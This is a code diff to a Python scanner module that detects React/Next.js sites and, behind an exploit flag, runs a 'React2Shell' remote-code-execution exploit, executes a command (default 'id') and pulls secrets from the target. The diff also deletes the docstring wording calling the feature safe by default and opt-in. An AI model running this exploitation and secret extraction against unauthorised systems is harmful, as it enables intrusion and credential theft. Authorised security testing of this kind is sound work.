@@ -1,14 +1,11 @@
 """
 React / Next.js detection module with optional React2Shell RCE exploitation.
-
-SAFE by default: fingerprints, extracts versions, scores RSC surface.
-When --exploit is enabled, attempts active RCE via React Server Components deserialization.
 """
 
 from __future__ import annotations
 
 from app.exploits.react2shell.detector import React2ShellDetector
-from app.exploits.react2shell.exploit import React2ShellExploit  # <-- NEW
+from app.exploits.react2shell.exploit import React2ShellExploit
 from app.modules.base import body_extractions, finding_from_hit, save_http_response
 from app.modules.vulnerability_intel import package_versions, react2shell_exposure
 from app.storage.models import Finding, ScanContext, TargetContext
@@ -259,7 +256,7 @@ class ReactModule:
             )
             ctx.progress.add_hit(module=self.name)
 
-        # ========== ACTIVE EXPLOITATION (opt-in) ==========
+        # ===== ACTIVE EXPLOITATION =====
         if ctx.exploit_enabled and ("nextjs" in tech or "react" in tech):
             exploit = React2ShellExploit(http, target.url)
             success, output = exploit.run(ctx.exploit_command or "id")
@@ -272,16 +269,14 @@ class ReactModule:
                         target=target,
                         url=target.url,
                         title="Next.js RCE via React2Shell (active)",
-                        description=f"Command executed: {ctx.exploit_command}\nOutput: {output[:500]}",
-                        evidence=output[:1000],
+                        evidence=f"Command output:\n{output[:500]}",
                         confidence=1.0,
                         tags=["nextjs", "rce", "react2shell", "active-exploit"],
                         validated=True,
                     )
                 )
                 ctx.progress.add_hit(module=self.name)
-                # Extract secrets
-                secrets = exploit.extract_secrets()
+                secrets = exploit.extract_secrets(ctx)
                 for category, lines in secrets.items():
                     if lines:
                         findings.append(
@@ -292,7 +287,6 @@ class ReactModule:
                                 target=target,
                                 url=target.url,
                                 title=f"Secret extraction: {category} (React2Shell)",
-                                description=f"Found {len(lines)} entries",
                                 evidence="\n".join(lines[:20]),
                                 confidence=0.95,
                                 tags=["nextjs", "secrets", category, "active-exploit"],
